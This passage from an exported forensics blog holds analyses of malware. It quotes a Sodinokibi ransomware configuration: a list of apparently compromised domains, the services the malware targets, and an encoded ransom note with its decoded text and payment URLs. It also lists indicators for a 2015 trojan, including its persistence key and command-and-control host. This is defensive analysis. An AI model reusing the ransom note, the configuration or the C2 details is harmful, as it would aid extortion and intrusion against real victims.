om.au;encounter-p.net;pharmeko-group.com;taulunkartano.fi;apmollerpension.com;5thactors.com;cap29010.it;metcalfe.ca;9nar.com;xn--80abehgab4ak0ddz.xn--p1ai;glennverschueren.be;solidhosting.nl;tutvracks.com;sveneulberg.de;factoriareloj.com;creohn.de;bajova.sk;manzel.tn;cops4causes.org;vvego.com;penumbuhrambutkeiskei.com;parseport.com;factorywizuk.com;oraweb.net;johnstonmingmanning.com;p-ride.live;matthieupetel.fr;limmortelyouth.com;premiumweb.com.ua:443;hiddensee-buhne11.de;switch-made.com;nationnewsroom.com;go.labibini.ch;electricianul.com;ceocenters.com;pvandambv.nl;selected-minds.de;four-ways.com;speiserei-hannover.de;skooppi.fi;agencewho-aixenprovence.fr;benchbiz.com;fta-media.com;innervisions-id.com;bourchier.org;cmascd.com;denverwynkoopdentist.com;jobscore.com;subquercy.fr;ahgarage.com;wordpress.idium.no;khtrx.com;ncn.nl;chomiksy.net;goddardleadership.org;toranjtuition.org;thestudio.academy;hensleymarketing.com;bayshoreelite.com;mgimalta.com;guohedd.com;brisbaneosteopathic.com.au;stralsund-ansichten.de;redpebblephotography.com;amorbellezaysalud.com;bellesiniacademy.org;letsstopsmoking.co.uk;amco.net.au;haus-landliebe.de;look.academy;tieronechic.com;expohomes.com;rizplakatjaya.com;blueridgeheritage.com;renehartman.nl;rino-gmbh.com;yayasanprimaunggul.org;ufovidmag.com;ocduiblog.com;breakluckrecords.com;myplaywin3.com;nexstagefinancial.com;ncjc.ca;envomask.com;mindfuelers.com;buffdaddyblog.com;the-cupboard.co.uk;concontactodirecto.com;marcandy.com;bratek-immobilien.de;log-barn.co.uk;rechtenplicht.be;victorvictoria.com;jobkiwi.com.ng;domilivefurniture.com;citiscapes-art.com;nbva.co.uk;smartworkplaza.com;altocontatto.net;rentingwell.com;advance-refle.com;wasnederland.nl;cyberpromote.de;supercarhire.co.uk;encounter-p.net;moira-cristescu.com;stanleyqualitysystems.com;lyricalduniya.com;memphishealthandwellness.com;c-sprop.com;jglconsultancy.com;humanviruses.org;texanscan.org;pureelements.nl;dieetuniversiteit.nl;palmenhaus-erfurt.de;egpu.fr;clinic-beethovenstrasse-ag.ch;pinkxgayvideoawards.com;lidkopingsnytt.nu;thiagoperez.com;arthakapitalforvaltning.dk;business-basic.de;mollymccarthydesign.com;trevi-vl.ru;gbk-tp1.de;grupoexin10.com;aciscomputers.com;zumrutkuyutemel.com;paardcentraal.nl;dinedrinkdetroit.com;affligemsehondenschool.be;spirello.nl;adterium.com;luvbec.com;alltagsrassismus-entknoten.de;georgemuncey.com;unislaw-narty.pl;poems-for-the-soul.ch;legundschiess.de;yournextshoes.com;sweetz.fr;m2graph.fr;rentsportsequip.com;berdonllp.com;chatterchatterchatter.com;glende-pflanzenparadies.de;ledyoucan.com;mediahub.co.nz;daveystownhouse.com;bendel-partner.de;galatee-couture.com;loysonbryan.com;kristianboennelykke.dk;catchup-mag.com;deziplan.ru;thepixelfairy.com;ziliak.com;cascinarosa33.it;dantreranch.com;grancanariaregional.com;invela.dk;gosouldeep.com;finnergo.eu;zealcon.ae;achetrabalhos.com;bruut.online;kerstliedjeszingen.nl;fi-institutionalfunds.com;sber-biznes.com;alexwenzel.de;amyandzac.com;schroederschoembs.com;adabible.org;chainofhopeeurope.eu;1deals.com;block-optic.com;auto-opel.ro;fidelitytitleoregon.com;teutoradio.de;billscars.net;craftstone.co.nz;happycatering.de;rhino-turf.com;reygroup.pt;rokthetalk.com;web865.com;fazagostar.co;craftron.com;anchelor.com;drnelsonpediatrics.com;subyard.com;avis.mantova.it;triplettabordeaux.fr;bakingismyyoga.com;karmeliterviertel.com;techybash.com;acibademmobil.com.tr;ziliak.com;johnkoen.com;precisetemp.com;nieuwsindeklas.be;forskolinslimeffect.net;rubyaudiology.com;muller.nl;annida.it;watchsale.biz;breathebettertolivebetter.com;rvside.com;davedavisphotos.com;welovecustomers.fr;futurenetworking.com;tanatek.com;pinthelook.com;azerbaycanas.com;ideamode.com;rename.kz;endlessrealms.net;astrographic.com;kamin-somnium.de;napisat-pismo-gubernatoru.ru:443;jag.me;pilotgreen.com;biketruck.de;circlecitydj.com;dierenambulancealkmaar.nl;alene.co;mrkluttz.com;animation-pro.co.uk;bd2fly.com;frameshift.it;theatre-embellie.fr;gsconcretecoatings.com;topvijesti.net;neonodi.be;jameswilliamspainting.com;outstandingminialbums.com;awaitspain.com;mind2muscle.nl;n-newmedia.de;wg-heiligenstadt.de;motocrosshideout.com;ntinasfiloxenia.gr;patriotcleaning.net;baita.ac;min-virksomhed.dk;chorusconsulting.net;activeterroristwarningcompany.com;entdoctor-durban.com;fsbforsale.com;birthplacemag.com;smartmind.net;endstarvation.com;proffteplo.com;90nguyentuan.com;palema.gr;cardsandloyalty.com;jax-interim-and-projectmanagement.com;thegetawaycollective.com;midwestschool.org;omegamarbella.com;enews-qca.com;trivselsguide.dk;sambaglow.com;kiraribeaute-nani.com;mindsparkescape.com;opt4cdi.com;zuerich-umzug.ch;yourhappyevents.fr;magnetvisual.com;arearugcleaningnyc.com;111firstdelray.com;bubbalucious.com;richardkershawwines.co.za;site.markkit.com.br;wribrazil.com;gazelle-du-web.com;animalfood-online.de;redctei.co;dinecorp.com;innersurrection.com;donau-guides.eu;imaginekithomes.co.nz;husetsanitas.dk;the3-week-diet.net;catalyseurdetransformation.com;blucamp.com;wyreforest.net;tchernia-conseil.fr;tages-geldvergleich.de;brunoimmobilier.com;onlinemarketingsurgery.co.uk;akwaba-safaris.com;charlesfrancis.photos;rs-danmark.dk;etgdogz.de;promus.ca;thisprettyhair.com;istantidigitali.com;artcase.pl;interlinkone.com;kenmccallum.com;casinodepositors.com;beauty-traveller.com;triavlete.com;banukumbak.com;mahikuchen.com;verbouwingsdouche.nl;galaniuklaw.com;livelai.com;eventosvirtualesexitosos.com;chris-anne.com;secrets-clubs.co.uk;myfbateam.com;the5thquestion.com;voetbalhoogeveen.nl;sunsolutions.es;kookooo.com;janellrardon.com;explora.nl;haard-totaal.nl;diverfiestas.com.es;druktemakersheerenveen.nl;neolaiamedispa.com;catering.com;optigas.com;nepressurecleaning.com;dogsunlimitedguide.com;innovationgames-brabant.nl;ciga-france.fr;peninggibadan.co.id;belofloripa.be;ilveshistoria.com;silverbird.dk;paradigmlandscape.com;asiaartgallery.jp;suonenjoen.fi;framemyballs.com;vedsegaard.dk;projektparkiet.pl;agora-collectivites.com;belinda.af;xn--billigafrgpatroner-stb.se;profibersan.com;fluzfluzrewards.com;nevadaruralhousingstudies.org;atma.nl;qandmmusiccenter.com;aidanpublishing.co.uk;andrealuchesi.it;molade.nl;mayprogulka.ru;bringmehope.org;forumsittard.nl;eatyoveges.com;raeoflightmusic.com;elliemaccreative.wordpress.com;barbaramcfadyenjewelry.com;delegationhub.com;cainlaw-okc.com;hom-frisor.dk;terraflair.de;mensemetgesigte.co.za;soncini.ch;lifeinbreaths.com;lashandbrowenvy.com;pansionatblago.ru;ijsselbeton.nl;deduktia.fi;jandhpest.com;advesa.com;photographycreativity.co.uk;cl0nazepamblog.com;dentalcircle.com;handyman-silkeborg.dk;biodentify.ai;global-migrate.com;pxsrl.it;andermattswisswatches.ch;krishnabrawijaya.com;janmorgenstern.com;akcadagofis.com;designimage.ae;sharonalbrightdds.com;brownswoodblog.com;aoyama.ac;rtc24.com;shrinkingplanet.com;aberdeenartwalk.org;imajyuku-sozoku.com;qrs-international.com;azloans.com;kenmccallum.com;energosbit-rp.ru;xrresources.com;basindentistry.com;corporacionrr.com;kuriero.pro;pro-gamer.pl;shortsalemap.com;logosindustries.com;rishigangoly.com;salonlamar.nl;latableacrepes-meaux.fr;pisofare.co;mslp.org;colored-shelves.com;kombi-dress.com;oscommunity.de;natturestaurante.com.br;qwikcoach.com;coachpreneuracademy.com;dr-vita.de;metroton.ru;alabamaroofingllc.com;lassocrm.com;grafikstudio-visuell.de;xtensifi.com;spacebel.be;lookandseen.com;greatofficespaces.net;koncept-m.ru;tothebackofthemoon.com;thesilkroadny.com;skyboundnutrition.co.uk;stagefxinc.com;crestgood.com;luvinsburger.fr;teamsegeln.ch;buonabitare.com;fridakids.com;sppdstats.com;rapid5kloan.org;radishallgood.com;soundseeing.net;louiedager.com;martha-frets-ceramics.nl;bilius.dk;triplettagaite.fr;k-zubki.ru;atelierkomon.com;osn.ro;bonitabeachassociation.com;ludoil.it;broccolisoep.nl;mrcar.nl;hypogenforensic.com;parentsandkids.com;pubcon.com;parisschool.ru;citydogslife.com;medicalsupportco.com;gaearoyals.com;prometeyagro.com.ua;bluetenreich-brilon.de;volta.plus;der-stempelking.de;girlish.ae;tellthebell.website;cac2040.com;leatherjees.com;skoczynski.eu;airvapourbarrier.com;devplus.be;golfclublandgoednieuwkerk.nl;bcabattoirs.org;johnsonweekly.com;happylublog.wordpress.com;wineandgo.hu;oththukaruva.com;b3b.ch;direitapernambuco.com;michal-s.co.il;ninjaki.com;speakaudible.com;saberconcrete.com;docarefoundation.org;hartofurniture.com;lovetzuchia.com;duthler.nl;therapybusinessacademy.com;stabilisateur.fr;bluemarinefoundation.com;customroasts.com;jonnyhooley.com;otpusk.zp.ua;palmecophilippines.com;fanuli.com.au;biblica.com;aquacheck.co.za;nepal-pictures.com;campinglaforetdetesse.com;premier-iowa.com;cormanmarketing.com;baptistdistinctives.org;charlottelhanna.com;zwemofficial.nl;plbinsurance.com;augen-praxisklinik-rostock.de;fskhjalmar.se;xn--80addfr4ahr.dp.ua;bychowo.pl;satoblog.org;purepreprod4.com;drbrianhweeks.com;eafx.pro;nourella.com;gatlinburgcottage.com;cc-experts.de;fitnessblenderstory.com;autoteamlast.de;studionumerik.fr;metallbau-hartmann.eu;pixelhealth.net;randyabrown.com;itheroes.dk;lollachiro.com;adaduga.info;smartercashsystem.com;ced-elec.com;sellthewrightway.com;solutionshosting.co.uk;dennisverschuur.com;piestar.com;ruggestar.ch;pays-saint-flour.fr;shortysspices.com;ramirezprono.com;groovedealers.ru;bavovrienden.nl;traitware.com;5pointpt.com;oncarrot.com;masecologicos.com;kausette.com;iron-mine.ru;burg-zelem.de;laylavalentine.com;skyscanner.ro;schluesseldienste-hannover.de;mariannelemenestrel.com;hostaletdelsindians.es;banksrl.co.za;jacquesgarcianoto.com;liepertgrafikweb.at;11.in.ua;livedeveloper.com;irizar.com;santastoy.store;lesyeuxbleus.net;dibli.store;naukaip.ru;sycamoregreenapts.com;margaretmcshane.com;fascaonline.com;richardiv.com;signamedia.de;motocrossplace.co.uk;brannbornfastigheter.se;profiz.com;cesep2019.com;leijstrom.com;nxtstg.org;opticahubertruiz.com;kosten-vochtbestrijding.be;zaczytana.com;thehovecounsellingpractice.co.uk;polynine.com;ayudaespiritualtamara.com;billigeflybilletter.dk;singletonfinancial.com;stathmoulis.gr;noda.com.ua;alisodentalcare.com;stage-infirmier.fr;vitormmcosta.com;kvetymichalovce.sk;ravage-webzine.nl;tecleados.com;hospitalitytrainingsolutions.co.uk;liveyourheartout.co;uncensoredhentaigif.com;signededenroth.dk;domaine-des-pothiers.com;epicjapanart.com;zorgboerderijravensbosch.nl;chatberlin.de;zinnystar.com;parksideseniorliving.net;jefersonalessandro.com;gratiocafeblog.wordpress.com;bookingwheel.com;nykfdyrehospital.dk;apogeeconseils.fr;ilovefullcircle.com;mneti.ru;justaroundthecornerpetsit.com;tramadolhealth.com;condormobile.fr;mariajosediazdemera.com;cxcompany.com;tradenavigator.ch;wirmuessenreden.com;tesisatonarim.com;schulz-moelln.de;leansupremegarcinia.net;ketomealprep.academy;riffenmattgarage.ch;ddmgen.com;annenymus.com;racefietsenblog.nl;hawthornsretirement.co.uk;efficiencyconsulting.es;lisa-poncon.fr;babysitting-hk.helpergo.co;hm-com.com;easydental.ae;dnqa.co.uk;newonestop.com;eyedoctordallas.com;baumfinancialservices.com;weddingceremonieswithtim.com;angelika-schwarz.com;lumturo.academy;eshop.design;aceroprime.com;bagaholics.in\\",\\n   \\"net\\":false,\\n   \\"svc\\":[\\n      \\"mepocs\\",\\n      \\"veeam\\",\\n      \\"sql\\",\\n      \\"vss\\",\\n      \\"sophos\\",\\n      \\"memtas\\",\\n      \\"backup\\",\\n      \\"svc$\\"\\n   ],\\n   \\"nbody\\":\\"LQAtAC0APQA9AD0AIABXAGUAbABjAG8AbQBlAC4AIABBAGcAYQBpAG4ALgAgAD0APQA9AC0ALQAtAA0ACgANAAoAWwArAF0AIABXAGgAYQB0AHMAIABIAGEAcABwAGUAbgA/ACAAWwArAF0ADQAKAA0ACgBZAG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAsACAAYQBuAGQAIABjAHUAcgByAGUAbgB0AGwAeQAgAHUAbgBhAHYAYQBpAGwAYQBiAGwAZQAuACAAWQBvAHUAIABjAGEAbgAgAGMAaABlAGMAawAgAGkAdAA6ACAAYQBsAGwAIABmAGkAbABlAHMAIABvAG4AIAB5AG8AdQByACAAcwB5AHMAdABlAG0AIABoAGEAcwAgAGUAeAB0AGUAbgBzAGkAbwBuACAAewBFAFgAVAB9AC4ADQAKAEIAeQAgAHQAaABlACAAdwBhAHkALAAgAGUAdgBlAHIAeQB0AGgAaQBuAGcAIABpAHMAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIAByAGUAYwBvAHYAZQByACAAKAByAGUAcwB0AG8AcgBlACkALAAgAGIAdQB0ACAAeQBvAHUAIABuAGUAZQBkACAAdABvACAAZgBvAGwAbABvAHcAIABvAHUAcgAgAGkAbgBzAHQAcgB1AGMAdABpAG8AbgBzAC4AIABPAHQAaABlAHIAdwBpAHMAZQAsACAAeQBvAHUAIABjAGEAbgB0ACAAcgBlAHQAdQByAG4AIAB5AG8AdQByACAAZABhAHQAYQAgACgATgBFAFYARQBSACkALgANAAoADQAKAFsAKwBdACAAVwBoAGEAdAAgAGcAdQBhAHIAYQBuAHQAZQBlAHMAPwAgAFsAKwBdAA0ACgANAAoASQB0AHMAIABqAHUAcwB0ACAAYQAgAGIAdQBzAGkAbgBlAHMAcwAuACAAVwBlACAAYQBiAHMAbwBsAHUAdABlAGwAeQAgAGQAbwAgAG4AbwB0ACAAYwBhAHIAZQAgAGEAYgBvAHUAdAAgAHkAbwB1ACAAYQBuAGQAIAB5AG8AdQByACAAZABlAGEAbABzACwAIABlAHgAYwBlAHAAdAAgAGcAZQB0AHQAaQBuAGcAIABiAGUAbgBlAGYAaQB0AHMALgAgAEkAZgAgAHcAZQAgAGQAbwAgAG4AbwB0ACAAZABvACAAbwB1AHIAIAB3AG8AcgBrACAAYQBuAGQAIABsAGkAYQBiAGkAbABpAHQAaQBlAHMAIAAtACAAbgBvAGIAbwBkAHkAIAB3AGkAbABsACAAbgBvAHQAIABjAG8AbwBwAGUAcgBhAHQAZQAgAHcAaQB0AGgAIAB1AHMALgAgAEkAdABzACAAbgBvAHQAIABpAG4AIABvAHUAcgAgAGkAbgB0AGUAcgBlAHMAdABzAC4ADQAKAFQAbwAgAGMAaABlAGMAawAgAHQAaABlACAAYQBiAGkAbABpAHQAeQAgAG8AZgAgAHIAZQB0AHUAcgBuAGkAbgBnACAAZgBpAGwAZQBzACwAIABZAG8AdQAgAHMAaABvAHUAbABkACAAZwBvACAAdABvACAAbwB1AHIAIAB3AGUAYgBzAGkAdABlAC4AIABUAGgAZQByAGUAIAB5AG8AdQAgAGMAYQBuACAAZABlAGMAcgB5AHAAdAAgAG8AbgBlACAAZgBpAGwAZQAgAGYAbwByACAAZgByAGUAZQAuACAAVABoAGEAdAAgAGkAcwAgAG8AdQByACAAZwB1AGEAcgBhAG4AdABlAGUALgANAAoASQBmACAAeQBvAHUAIAB3AGkAbABsACAAbgBvAHQAIABjAG8AbwBwAGUAcgBhAHQAZQAgAHcAaQB0AGgAIABvAHUAcgAgAHMAZQByAHYAaQBjAGUAIAAtACAAZgBvAHIAIAB1AHMALAAgAGkAdABzACAAZABvAGUAcwAgAG4AbwB0ACAAbQBhAHQAdABlAHIALgAgAEIAdQB0ACAAeQBvAHUAIAB3AGkAbABsACAAbABvAHMAZQAgAHkAbwB1AHIAIAB0AGkAbQBlACAAYQBuAGQAIABkAGEAdABhACwAIABjAGEAdQBzAGUAIABqAHUAcwB0ACAAdwBlACAAaABhAHYAZQAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5AC4AIABJAG4AIABwAHIAYQBjAHQAaQBzAGUAIAAtACAAdABpAG0AZQAgAGkAcwAgAG0AdQBjAGgAIABtAG8AcgBlACAAdgBhAGwAdQBhAGIAbABlACAAdABoAGEAbgAgAG0AbwBuAGUAeQAuAA0ACgANAAoAWwArAF0AIABIAG8AdwAgAHQAbwAgAGcAZQB0ACAAYQBjAGMAZQBzAHMAIABvAG4AIAB3AGUAYgBzAGkAdABlAD8AIABbACsAXQANAAoADQAKAFkAbwB1ACAAaABhAHYAZQAgAHQAdwBvACAAdwBhAHkAcwA6AA0ACgANAAoAMQApACAAWwBSAGUAYwBvAG0AbQBlAG4AZABlAGQAXQAgAFUAcwBpAG4AZwAgAGEAIABUAE8AUgAgAGIAcgBvAHcAcwBlAHIAIQANAAoAIAAgAGEAKQAgAEQAbwB3AG4AbABvAGEAZAAgAGEAbgBkACAAaQBuAHMAdABhAGwAbAAgAFQATwBSACAAYgByAG8AdwBzAGUAcgAgAGYAcgBvAG0AIAB0AGgAaQBzACAAcwBpAHQAZQA6ACAAaAB0AHQAcABzADoALwAvAHQAbwByAHAAcgBvAGoAZQBjAHQALgBvAHIAZwAvAA0ACgAgACAAYgApACAATwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBhAHAAbABlAGIAegB1ADQANwB3AGcAYQB6AGEAcABkAHEAawBzADYAdgByAGMAdgA2AHoAYwBuAGoAcABwAGsAYgB4AGIAcgA2AHcAawBlAHQAZgA1ADYAbgBmADYAYQBxADIAbgBtAHkAbwB5AGQALgBvAG4AaQBvAG4ALwB7AFUASQBEAH0ADQAKAA0ACgAyACkAIABJAGYAIABUAE8AUgAgAGIAbABvAGMAawBlAGQAIABpAG4AIAB5AG8AdQByACAAYwBvAHUAbgB0AHIAeQAsACAAdAByAHkAIAB0AG8AIAB1AHMAZQAgAFYAUABOACEAIABCAHUAdAAgAHkAbwB1ACAAYwBhAG4AIAB1AHMAZQAgAG8AdQByACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlAC4AIABGAG8AcgAgAHQAaABpAHMAOgANAAoAIAAgAGEAKQAgAE8AcABlAG4AIAB5AG8AdQByACAAYQBuAHkAIABiAHIAbwB3AHMAZQByACAAKABDAGgAcgBvAG0AZQAsACAARgBpAHIAZQBmAG8AeAAsACAATwBwAGUAcgBhACwAIABJAEUALAAgAEUAZABnAGUAKQANAAoAIAAgAGIAKQAgAE8AcABlAG4AIABvAHUAcgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBkAGUAYwByAHkAcAB0AG8AcgAuAHQAbwBwAC8AewBVAEkARAB9AA0ACgANAAoAVwBhAHIAbgBpAG4AZwA6ACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlACAAYwBhAG4AIABiAGUAIABiAGwAbwBjAGsAZQBkACwAIAB0AGgAYQB0AHMAIAB3AGgAeQAgAGYAaQByAHMAdAAgAHYAYQByAGkAYQBuAHQAIABtAHUAYwBoACAAYgBlAHQAdABlAHIAIABhAG4AZAAgAG0AbwByAGUAIABhAHYAYQBpAGwAYQBiAGwAZQAuAA0ACgANAAoAVwBoAGUAbgAgAHkAbwB1ACAAbwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQAsACAAcAB1AHQAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAZABhAHQAYQAgAGkAbgAgAHQAaABlACAAaQBuAHAAdQB0ACAAZgBvAHIAbQA6AA0ACgBLAGUAeQA6AA0ACgANAAoAewBLAEUAWQB9AA0ACgANAAoADQAKAEUAeAB0AGUAbgBzAGkAbwBuACAAbgBhAG0AZQA6AA0ACgANAAoAewBFAFgAVAB9AA0ACgANAAoALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgANAAoAIQAhACEAIABEAEEATgBHAEUAUgAgACEAIQAhAA0ACgBEAE8ATgBUACAAdAByAHkAIAB0AG8AIABjAGgAYQBuAGcAZQAgAGYAaQBsAGUAcwAgAGIAeQAgAHkAbwB1AHIAcwBlAGwAZgAsACAARABPAE4AVAAgAHUAcwBlACAAYQBuAHkAIAB0AGgAaQByAGQAIABwAGEAcgB0AHkAIABzAG8AZgB0AHcAYQByAGUAIABmAG8AcgAgAHIAZQBzAHQAbwByAGkAbgBnACAAeQBvAHUAcgAgAGQAYQB0AGEAIABvAHIAIABhAG4AdABpAHYAaQByAHUAcwAgAHMAbwBsAHUAdABpAG8AbgBzACAALQAgAGkAdABzACAAbQBhAHkAIABlAG4AdABhAGkAbAAgAGQAYQBtAGcAZQAgAG8AZgAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5ACAAYQBuAGQALAAgAGEAcwAgAHIAZQBzAHUAbAB0ACwAIABUAGgAZQAgAEwAbwBzAHMAIABhAGwAbAAgAGQAYQB0AGEALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAA0ACgBPAE4ARQAgAE0ATwBSAEUAIABUAEkATQBFADoAIABJAHQAcwAgAGkAbgAgAHkAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAgAHQAbwAgAGcAZQB0ACAAeQBvAHUAcgAgAGYAaQBsAGUAcwAgAGIAYQBjAGsALgAgAEYAcgBvAG0AIABvAHUAcgAgAHMAaQBkAGUALAAgAHcAZQAgACgAdABoAGUAIABiAGUAcwB0ACAAcwBwAGUAYwBpAGEAbABpAHMAdABzACkAIABtAGEAawBlACAAZQB2AGUAcgB5AHQAaABpAG4AZwAgAGYAbwByACAAcgBlAHMAdABvAHIAaQBuAGcALAAgAGIAdQB0ACAAcABsAGUAYQBzAGUAIABzAGgAbwB1AGwAZAAgAG4AbwB0ACAAaQBuAHQAZQByAGYAZQByAGUALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAAAA\\",\\n   \\"nname\\":\\"{EXT}-readme.txt\\",\\n   \\"exp\\":false,\\n   \\"img\\":\\"QQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA\\",\\n   \\"arn\\":false\\n}\\n ```\\n\\nWhat are the contents of `nbody` and `img`? Thats simple:\\n\\n## nbody\\n\\n```\\n---=== Welcome. Again. ===---\\n\\n[+] Whats Happen? [+]\\n\\nYour files are encrypted, and currently unavailable. You can check it: all files on your system has extension {EXT}.\\n\\nBy the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\\n\\n[+] What guarantees? [+]\\n\\nIts just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.\\n\\nTo check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.\\n\\nIf you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practise - time is much more valuable than money.\\n\\n[+] How to get access on website? [+]\\n\\nYou have two ways:\\n\\n1) [Recommended] Using a TOR browser!\\n\\na) Download and install TOR browser from this site: https://torproject.org/\\n\\nb) Open our website: http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/{UID}\\n\\n2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:\\n\\na) Open your any browser (Chrome, Firefox, Opera, IE, Edge)\\n\\nb) Open our secondary website: http://decryptor.top/{UID}\\n\\nWarning: secondary website can be blocked, thats why first variant much better and more available.\\n\\nWhen you open our website, put the following data in the input form:\\n\\nKey:\\n\\n{KEY}\\n\\nExtension name:\\n\\n{EXT}\\n\\n-----------------------------------------------------------------------------------------\\n\\n!!! DANGER !!!\\n\\nDONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damge of the private key and, as result, The Loss all data.\\n\\n!!! !!! !!!\\n\\nONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.\\n\\n!!! !!! !!!\\n```\\n\\n## img\\n\\n```\\nAll of your files are encrypted!\\n\\nFind {EXT}-readme.txt and follow instuctions\\n```\\n\\n## Bad crypto\\n\\nIn my eyes, the interesting part of the section is the following entry:\\n\\n```json\\n\\"pk\\":\\"3sB5vqBW0kuO3Nr56Ql+TMjaDchoEjxcKxBA/XbSJks=\\"\\n```\\n\\nThe value of this entry (which is 256 bits large) is decoded and stored as a global static variable at `0x00??DBA0` (the address may be different on your system at the position that I marked with ??). Unfortunately, I was not able to spot further read or write accesses to this address, but I\'m working on it.\\n\\n# Other traces\\n\\n## File size\\n\\nAll encrypted files have the same size as their unencrypted pendants. This means:\\n\\n- some kind of stream cipher is being used, such as AES-CTR or AES-GCM\\n- there are no meta information stored in the files\\n\\n## Domains\\n\\nThe entry dmn contains a list of domains, which may be compromised and may be used to spread malware. So I filed a claim and sent the full list to the police. Let\'s see if they can inform all potential victim. However, you should for now at least log accesses to the mentioned sites."},{"id":"/2015/12/01/new-malware-pro-invoicewmz45445","metadata":{"permalink":"/blog/2015/12/01/new-malware-pro-invoicewmz45445","source":"@site/blog/2015-12-01-new-malware-pro-invoicewmz45445.mdx","title":"New Malware: \\"Pro InvoiceWMZ45445\\"","description":"During the last few days I received two mails with the following attachment:","date":"2015-12-01T00:00:00.000Z","tags":[],"readingTime":1.11,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"New Malware: \\"Pro InvoiceWMZ45445\\"","date":"2015-12-01","categories":["forensics","malware"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Does Sodinokibi use bad crypto?","permalink":"/blog/2020/01/08/does-sodinokibi-use-bad-crypto"},"nextItem":{"title":"Merging wordlist files","permalink":"/blog/2015/08/05/merging-wordlist-files"}},"content":"During the last few days I received two mails with the following attachment:\\n\\n`Pro InvoiceWMZ45445.rar`\\n\\nwhich contains an .exe file with the same name:\\n\\n![ProInvoice1](/img/2015-12-01-new-malware-pro-invoicewmz45445/proinvoice1.png)\\n\\n\xa0\\n\\n**Metadata\xa0**of `Pro InvoiceWMZ45445.exe`:****\\n\\n- MD5:\xa0`4EE08155DB928C449EDEA28D6A68B8CA`\\n- SHA1:\xa0`6F57853E8788E2BD8E1433D8B2E1A701774593A4`\\n- File Version:\xa0`1.0.0.1`\\n- File Description: `TODO: <File description>`\\n- Created with:\xa0`Microsoft Visual C++ ver. 8.0 [DEBUG] / Visual Studio 2005`\\n\\n**Indicators of Compromise (IOC) of `Pro InvoiceWMZ45445.exe`:**\\n\\nUpon execution, the file does the following:\\n\\n- wait 30 seconds\\n- create a file `sample.exe` under `%AppData%RoamingNew folder`\\n- starts the previously created file\\n- installs the `sample.exe` under `HKCUSoftwareMicrosoftWindowsCurrentVersionRunSample (Autostart)`\\n- changes some Internet Explorer Setting\\n\\n![procdot](/img/2015-12-01-new-malware-pro-invoicewmz45445/procdot.png)\\n\\n\xa0\\n\\n**Metadata\xa0**of `sample.exe`:****\\n\\n`sample.exe` has the same Hashes as `Pro InvoiceWMZ45445.exe`. Interesting, isn\'t it? So, this Malware isn\'t a Dropper; but instead it installs itself under a different name.\\n\\n**Indicators of Compromise (IOC) of `sample.exe`:**\\n\\n- creates the Mutant `Sessions1BaseNamedObjectsMUTEX-zZEeV-Zndko`\\n- tries to resolve fredamata81.ddns.net\\n- tries to connect to port 2015 of fredamata81.ddns.net (which seems to be closed at the moment)\\n- consumes a lot of CPU time (20% on my machine)\\n\\n**Additional Information**\\n\\n- The executable has Debug information stored externally in\xa0`d:bak_desktopnew folderstub1000_11_25_2015bdebugstub1000_11_25_2015b.pdb`. I assume the file has been compiled on 2015/11/25. Maybe ;-)\\n\\nMore dynamic analysis will follow soon. First I must remove the call to `IsDebuggerPresent()`. But not today, anymore...\\n\\n**Update:**\\n\\nVirustotal has documented this specimen under\xa0[https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/](https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/ \\"https://www.virustotal.com/de/file/bf6c2c3f9cbb35023a38516e6b438f9125b7056429804c88c444fa37e0254956/analysis/\\")"},{"id":"/2015/08/05/merging-wordlist-files","metadata":{"permalink":"/blog/2015/08/05/merging-wordlist-files","source":"@site/blog/2015-08-05-merging-wordlist-files.mdx","title":"Merging wordlist files","description":"Sometimes when cracking password, one has to create password candidates which are combinations of words from a wordlist. Unfortunately, common password 